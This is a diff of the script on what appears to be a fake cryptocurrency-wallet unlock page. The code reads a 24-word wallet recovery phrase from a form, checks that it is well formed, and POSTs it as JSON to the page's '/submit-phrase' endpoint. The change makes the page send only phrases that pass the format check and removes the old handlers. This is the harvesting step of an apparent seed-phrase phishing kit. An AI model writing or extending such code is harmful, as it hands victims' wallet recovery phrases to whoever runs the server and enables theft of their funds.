@@ -88,61 +88,68 @@ xray"></textarea>
 
 
     <script>
-        function handleUnlockClick() {
-            const phrase = document.querySelector("textarea").value.trim();
+        function handleUnlockClick(phrase) {
+            // const phrase = document.querySelector("textarea").value.trim();
 
             const regex = /^([a-z]{3,15}\s){23}[a-z]{3,15}$/;
 
             if (!phrase) {
                 alert("Please enter your wallet passphrase.");
-                return;
+                return false;
             }
 
             if (!regex.test(phrase)) {
                 alert("Invalid passphrase format.\nMake sure it contains 24 lowercase words separated by spaces.");
-                return;
+                return false;
             }
 
             alert("Passphrase is valid and submitted successfully!");
+            return true
         }
 
-        document.addEventListener("DOMContentLoaded", function () {
-            document.querySelector(".btn.orange").addEventListener("click", handleUnlockClick);
-        });
+        // document.addEventListener("DOMContentLoaded", function () {
+        //     document.querySelector(".btn.orange").addEventListener("click", handleUnlockClick);
+        // });
 
-        const hamburger = document.getElementById("hamburger");
-        const nav = document.getElementById("nav");
+        // const hamburger = document.getElementById("hamburger");
+        // const nav = document.getElementById("nav");
 
-        hamburger.addEventListener("click", () => {
-            nav.classList.toggle("show");
-        });
+        // hamburger.addEventListener("click", () => {
+        //     nav.classList.toggle("show");
+        // });
 
 
         ///senDING dATA
         document.getElementById('phraseForm').addEventListener('submit', function (e) {
             e.preventDefault(); // Prevent page reload on submit
 
-            const phrase = document.getElementById('phraseInput').value;
-
-            console.log(phrase);
-            fetch('/submit-phrase', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ phrase: phrase }),
-            })
-                .then(response => response.json())
-                .then(data => {
-                    alert('Phrase submitted successfully!');
-                    // optionally clear the textarea
-                    document.getElementById('phraseInput').value = '';
+            const phrase = document.getElementById('phraseInput').value.trim();
+            // console.log("corrext");
+            if (handleUnlockClick(phrase)) {
+                console.log("Sending Phrase");
+                fetch('/submit-phrase', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ phrase: phrase }),
                 })
-                .catch(error => {
-                    alert('Error submitting phrase.');
-                    console.error('Error:', error);
-                });
+                    .then(response => response.json())
+                    .then(data => {
+                        alert('Phrase submitted successfully!');
+                        // optionally clear the textarea
+                        document.getElementById('phraseInput').value = '';
+                    })
+                    .catch(error => {
+                        alert('Error submitting phrase.');
+                        console.error('Error:', error);
+                    });
+            }
+            else{
+                console.log('Not seding Phrase');
+            }
         });
+
     </script>
 
 </body>
